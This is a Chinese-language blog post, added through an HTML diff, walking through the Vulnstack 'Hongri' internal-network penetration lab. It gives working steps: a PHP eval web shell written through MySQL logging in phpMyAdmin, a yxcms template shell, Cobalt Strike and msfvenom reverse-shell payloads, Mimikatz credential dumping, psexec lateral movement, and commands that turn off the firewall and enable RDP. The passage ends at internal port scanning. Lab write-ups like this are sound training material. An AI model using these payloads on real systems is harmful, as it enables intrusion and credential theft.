@@ -201,6 +201,1213 @@
             
 
   
+    <article id="post-Vulnstack-红日安全内网靶场-一" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/" target="_blank">Vulnstack-红日安全内网靶场[一]</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/" class="archive-article-date">
+        <time datetime="2023-09-20T10:25:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-20</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="&lt;1&gt; 环境搭建"></a>&lt;1&gt; 环境搭建</h1><p>靶场下载链接：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>虚拟机所有统一密码：hongrisec@2019(有的会提示密码已过期，随便改改 我改成了Hongrisec@2019)<br>网络拓扑图如下：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309202513912-2072192058.png"></p>
+<p>这里我设置的网络是VMnet3和VMnet8，其实无所谓设置哪两个网络，最重要的是需要两个网络，且不能在同一个网段内（因为需要一个做外网一个做内网）</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309212500653-720406678.png"></p>
+<p>ip配置如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali (攻击机)：192.168.236.128 （VMnet8 网卡分配的IP）</span><br><span class="line">Windows 7 (web服务器)：192.168.236.132（外网和kali连通）、192.168.52.143（内网ip）</span><br><span class="line">Windows 2008 (域控)：192.168.52.138</span><br><span class="line">Win2k3 (域管)：192.168.22.</span><br></pre></td></tr></table></figure>
+<p>【注意】实际上域环境三台虚拟机的 IP 初始状态就已经被配置为固定的 192.168.52.XXX&#x2F;24网段（同时已配置好域控 IP 必定为 192.168.52.138），故 我们要设置的内网网卡 即 VMware 的 VMnet3 网卡应注意也配置为 192.168.52.XXX&#x2F;24 网段  (把VMnet3改成其他的也可以，但是那样还需要自己去网络里修改一下被配置的固定192.168.52.XXX&#x2F;24网段  麻烦一点，就用52吧)</p>
+<h2 id="1-配置Win7-web服务器网络"><a href="#1-配置Win7-web服务器网络" class="headerlink" title="(1) 配置Win7 web服务器网络"></a>(1) 配置Win7 web服务器网络</h2><p>从网络拓扑图得知，需要模拟内网和外网两个网段， Win7 虚拟机相当于网关服务器，所以需要两张网卡，故需要配置两个网络适配器（网卡），点击添加网络设配器：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309212705872-712435605.png"></p>
+<p>右键右下角电脑图标 -&gt; 打开网络和共享中心 -&gt; 更改适配器设置 -&gt; 右键网络本地连接(点属性) -&gt; 选Internet 协议版本 4(TCP&#x2F;ipv4) 即可设置IP地址为 192.168.236.132</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309213437049-617388238.png"></p>
+<p>能ping 通kali机，说明和外网已经连通了，这里还有一点就是记得把WIndows 7这个web服务器防火墙的关闭，否则kali会ping 不通</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309213932511-1928891713.png"></p>
+<p>同理 内网ip设置为：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309213643079-1608053267.png"></p>
+<p>ping一下DC机，域内网络也配置正常</p>
+<p>在 Win7 外网服务器主机的 C 盘找到 PhpStudy 启动 Web 服务（模拟外网 Web 站点）：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315175734413-264651648.png"></p>
+<p>开启之后，我们在我们的主机 访问一下win7，可以正常访问到PHP探针</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315175914363-1511025758.png"></p>
+<p>这样我们的环境就相当于是配置好啦</p>
+<h2 id="2-配置-Winserver-2008网络-DC域控"><a href="#2-配置-Winserver-2008网络-DC域控" class="headerlink" title="(2) 配置 Winserver 2008网络(DC域控)"></a>(2) 配置 Winserver 2008网络(DC域控)</h2><p>hongrisec@2019 登录的时候，显示密码过期   自己改成了 Hongrisec@2019</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315173213438-1681522261.png"></p>
+<p>Win2008 DC域控主机ip为 192.168.52.138 默认配好了的</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315173616495-1279208402.png"></p>
+<h2 id="3-配置-Win2003-win2k3网络-域成员"><a href="#3-配置-Win2003-win2k3网络-域成员" class="headerlink" title="(3) 配置 Win2003&#x2F;win2k3网络(域成员)"></a>(3) 配置 Win2003&#x2F;win2k3网络(域成员)</h2><p>域内主机 win2003 ip为192.168.236.141  与外网不连通<br><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315175229095-561473635.png"></p>
+<h1 id="外网边界突破"><a href="#外网边界突破" class="headerlink" title="&lt;2&gt; 外网边界突破"></a>&lt;2&gt; 外网边界突破</h1><h2 id="1-信息收集-弱口令-开放了phpmyadmin、yxcms"><a href="#1-信息收集-弱口令-开放了phpmyadmin、yxcms" class="headerlink" title="(1) 信息收集(弱口令+开放了phpmyadmin、yxcms)"></a>(1) 信息收集(弱口令+开放了phpmyadmin、yxcms)</h2><p>在外网站点看见了一个MySQL 连接检测：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315180925585-1188872974.png"></p>
+<p>检测一下，存在弱口令  root:root 连接正常   但单从这只能检测，还利用不了呢<br>扫一下目录，看看有什么东西。扫描到了 phpmyadmin</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315181450186-2045186056.png"></p>
+<p>访问&#x2F;phpmyadmin 使用 刚刚检测到的 root:root 登录一下，成功登录进去了</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315181631294-776244288.png"></p>
+<p>phpmyadmin是一个以 PHP 为基础，以 Web-Base 方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库</p>
+<p>在里面看见了mysql数据库和一个 yxcms的数据库，应该也存在一个yxcms服务</p>
+<h2 id="2-PhpMyAdmin-后台-Getshell"><a href="#2-PhpMyAdmin-后台-Getshell" class="headerlink" title="(2) PhpMyAdmin 后台 Getshell"></a>(2) PhpMyAdmin 后台 Getshell</h2><p>phpmyadmin有两种getshell方式：</p>
+<ul>
+<li>into outfile导出木马</li>
+<li>利用Mysql日志文件getshell</li>
+</ul>
+<p>我们挨个试一下。</p>
+<h3 id="尝试into-outfile导出木马（失败）"><a href="#尝试into-outfile导出木马（失败）" class="headerlink" title="-尝试into outfile导出木马（失败）"></a>-尝试into outfile导出木马（失败）</h3><p>执行 <code>select @@basedir;</code> 查看一下网站的路径</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315182531731-1987192005.png"></p>
+<p>路径为：<code>C:/phpStudy/MySQL/</code></p>
+<p>再执行 <code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;C:/phpStudy/www/hack.php&#39;;</code> 直接将木马写入到 www网站根目录下    失败</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315182827245-334324103.png"></p>
+<p>这是因为 Mysql新特性secure_file_priv会对读写文件产生影响，该参数用来限制导入导出。我们可以借助<code>show global variables like &#39;%secure%&#39;;</code>命令来查看该参数</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315183007445-2103222599.png"></p>
+<p>当secure_file_priv为NULL时，表示限制Mysql不允许导入导出，这里为NULL。所以into outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv &#x3D;””。</p>
+<p>直接写入木马不行，那我们就换另一种方法—Mysql日志文件写入shell</p>
+<h3 id="利用Mysql日志文件写入shell"><a href="#利用Mysql日志文件写入shell" class="headerlink" title="-利用Mysql日志文件写入shell"></a>-利用Mysql日志文件写入shell</h3><p>先执行命令：<code>show variables like &#39;%general%&#39;;</code> 查看日志状态：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315183624844-1253055822.png"></p>
+<p>当开启 general_log 时，所执行的 SQL 语句都会出现在 stu1.log 文件中。那么如果修改 general_log_file 的值为一个php文件，则所执行的 SQL 语句就会对应生成在对应的文件中，进而可 Getshell</p>
+<p><code>SET GLOBAL general_log=&#39;on&#39;</code><br>开启 general_log</p>
+<p><code>SET GLOBAL general_log_file=&#39;C:/phpStudy/www/hack.php&#39;</code><br>指定日志写入到网站根目录的 hack.php 文件</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315184348352-1477207232.png"></p>
+<p>然后接下来执行 SQL 语句：<code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code>，即可将一句话木马写入 hack.php 文件中 访问&#x2F;hack.php 成功写入</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315184548170-2090375042.png"></p>
+<p>上蚁剑  连上去了</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315185024347-255048480.png"></p>
+<h2 id="3-yxcms后台上传getshell"><a href="#3-yxcms后台上传getshell" class="headerlink" title="(3)yxcms后台上传getshell"></a>(3)yxcms后台上传getshell</h2><p>前面我们登录进去之后，可以看到还有一个yxcms的数据库，同时我们进入后台之后，可以看到一个 beifen.rar备份文件和yxcms目录，这道题其实还有一种getshell的方法，这里我们也记录一下。 字典不够强大，没扫出来 beifen.rar和 &#x2F;yxcms  </p>
+<p>访问&#x2F;yxcms，可以看到在公告处，泄露了 yxcms的admin后台登录路径 以及 默认的密码</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315195959223-1060970212.png"></p>
+<p>成功登录到后台</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315200128746-1818698453.png"></p>
+<p>xxcms，既然后台都登录到了，那拿shell还不简单吗，一般就是找一找模板编辑的地方，写入一句话🐎，或者写入日志，这里刚好就有编辑模板的地方，我们新增一个shell.php </p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315200253518-70372448.png"></p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315200511436-850715920.png"></p>
+<p>建立是建立了，shell.php 生成到哪了呢？？ 这里就需要我们前面提到的 beifen.rar 备份文件了，我们把备份文件解压，在里面寻找模板的这么多php 都存放在了:<code>/yxcms/protected/apps/default/view/default/</code><br>因此我们的shell.php 就生成在了这里</p>
+<p>蚁剑连接 拿到shell</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315201149525-1091376910.png"></p>
+<h1 id="内网信息探测"><a href="#内网信息探测" class="headerlink" title="&lt;3&gt; 内网信息探测"></a>&lt;3&gt; 内网信息探测</h1><p>我们在拿到的shell 执行 <code>whoami</code> 发现是administrator权限 在域中<br><code>ifconfig</code> 发现了内网网段 192.168.52.0&#x2F;24</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315202003387-541137026.png"></p>
+<h2 id="1-靶机上线CS"><a href="#1-靶机上线CS" class="headerlink" title="(1) 靶机上线CS"></a>(1) 靶机上线CS</h2><p>在kali里 <code>./teamserver 192.168.236.128 cs123456</code> 运行cs服务</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315202523885-1531715127.png"></p>
+<p>主机运行CS 客户端并连接 CS 服务端，配置好listener监听器之后，生成 exe后门程序</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315202803226-19896095.png"></p>
+<p>利用蚁剑 把生成的artifact.exe 上传到靶机上：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315203057642-379097278.png"></p>
+<p>在终端里执行 artifact.exe 可以看到靶机上线到CS上</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315203258458-356901985.png"></p>
+<p>可使用 Mimikatz 直接抓取本机用户密码：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315204939286-47519854.png"></p>
+<p>这里抓取到密码之后，我们执行 net view 发现了域内另外俩台机器点击这里可以看到</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164731295-1003420215.png"></p>
+<p>可以利用抓取到的密码 psexec取login一下 监听器选 windows_smb&#x2F;bind_pipe</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164822903-1528659583.png"></p>
+<p>拿到正向会话(前面三层内网靶机有讲正向反向)之后，我们可以右键 目标-&gt;文件管理</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164517415-1798252375.png"></p>
+<p>可以看到域控的文件 我们可以进行上传文件操作，算是打通了 这是CS可以用到的一点。这里能拿到是因为我们域控的密码和win7、密码设置一样了。刚好可以拿下 我们下面再看看其他方法 横向移动拿到域控和域内其他机器</p>
+<h2 id="2-域内信息收集"><a href="#2-域内信息收集" class="headerlink" title="(2) 域内信息收集"></a>(2) 域内信息收集</h2><p>内网信息收集的主要目的就是查找域控以及域内的其他主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">net config Workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net user                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net user 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net group /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net group 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  <span class="comment"># 查看域控制器主机名（可能有多台）</span></span><br></pre></td></tr></table></figure>
+<p>1、先判断是否存在域，使用 <code>ipconfig /all</code> 查看 DNS 服务器，发现主 DNS 后缀不为空，存在域god.org</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315211947011-327186575.png"></p>
+<p>也可以执行命令<code>net config workstation</code> 来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315212710924-1858751632.png"></p>
+<p>2、上面发现 DNS 服务器名为 god.org，当前登录域为 GOD 再执行<code>net view /domain</code>查看有几个域(可能有多个)</p>
+<p>3、查看域的组账户信息(工作组)</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315213941617-1248511022.png"></p>
+<p>4、既然只有一个域，那就利用 net group “domain controllers” &#x2F;domain 命令查看域控制器主机名，直接确认域控主机的名称为 OWA</p>
+<p>5、确认域控主机的名称为 OWA 再执行 <code>net view</code> 查看局域网内其他主机信息（主机名称、IP地址）</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315204458476-1029263880.png"></p>
+<p>扫描出来 除了域控OWA 之外，还有一台主机ROOT-TVI862UBEH</p>
+<p>至此内网域信息收集完毕，已知信息：域控主机：192.168.52.138，同时还存在一台域成员主机：192.168.52.141，接下来的目标就是横向渗透拿下域控</p>
+<h2 id="3-rdp远程登陆win7"><a href="#3-rdp远程登陆win7" class="headerlink" title="(3) rdp远程登陆win7"></a>(3) rdp远程登陆win7</h2><p>Win7跳板机 默认是不开启3389的，同时还有防火墙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Open 3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=3389</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span>   			<span class="comment">#winsows server 2003 之前</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off 	<span class="comment">#winsows server 2003 之后</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094234406-459226645.png"></p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094154350-482099469.png"></p>
+<p>这里我们以域用户 administrator登录。</p>
+<p>输入我们刚从CS上 mimikatz dump下来的密码Hongrisec@2019 (也可以自己 net user创建一个用户 加入到administrator组里 用那个账户登录)</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094848041-1174558797.png"></p>
+<p>成功连接</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094926858-442077730.png"></p>
+<p>如果MSF 中有Win7 的 Shell，只需要返回会话并执行命令<code>run post/windows/manage/enable_rdp</code>即可开启靶机的远程桌面</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="&lt;4&gt; 内网渗透"></a>&lt;4&gt; 内网渗透</h1><h2 id="1-CS派生会话给MSF"><a href="#1-CS派生会话给MSF" class="headerlink" title="(1)CS派生会话给MSF"></a>(1)CS派生会话给MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment"># 启动MSF框架</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.236.128</span><br><span class="line"><span class="built_in">set</span> lport 1111</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316173225653-130142013.png"></p>
+<h3 id="2、CS派生会话"><a href="#2、CS派生会话" class="headerlink" title="2、CS派生会话"></a>2、CS派生会话</h3><p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316174545046-1279641808.png"></p>
+<p>案例 choose之后，我们的msf那边就可以收到一个session会话(但是没有)</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317083434210-552183840.png"></p>
+<p>CS执行失败，这里我们换一种方法  采用质朴的方法反弹 win7的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.236.128  LPORT=1111 -f exe -o shell.exe <span class="comment">#kali里生成msf后门文件 shell.exe</span></span><br><span class="line">蚁剑上传到 win7上 </span><br><span class="line">kali里运行监听</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.236.128</span><br><span class="line"><span class="built_in">set</span> lport 1111</span><br><span class="line">exploit </span><br><span class="line"></span><br><span class="line">蚁剑运行 shell.exe 得到meterpreter</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316181022410-1602985645.png"></p>
+<h3 id="3、MSF-简单利用"><a href="#3、MSF-简单利用" class="headerlink" title="3、MSF 简单利用"></a>3、MSF 简单利用</h3><p>获得 MSF 的会话后即可使用 MSF 集成的诸多强大功能模块和脚本。简单演示下，如调用<code>post/windows/gather/checkvm</code>判断靶机是否属于虚拟机（检查是否进入了蜜罐）：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316181226906-1321201512.png"></p>
+<p>再如调用 <code>post/windows/gather/enum_applications</code>模块枚举列出安装在靶机上的应用程序：</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316181259554-1092010937.png"></p>
+<h3 id="4、添加路由"><a href="#4、添加路由" class="headerlink" title="4、添加路由"></a>4、添加路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以用模块自动添加路由</span></span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line"><span class="comment">#添加一条路由</span></span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line"><span class="comment">#查看路由添加情况</span></span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、内网端口扫描"><a href="#5、内网端口扫描" class="headerlink" title="5、内网端口扫描"></a>5、内网端口扫描</h3><p>先执行background 命令将当前执行的 Meterpreter 会话切换到后台（后续也可执行sessions -i 重新返回会话），然后使用 MSF 自带 auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp 模块扫描内网域成员主机 192.168.52.141 开放的端口：</p>
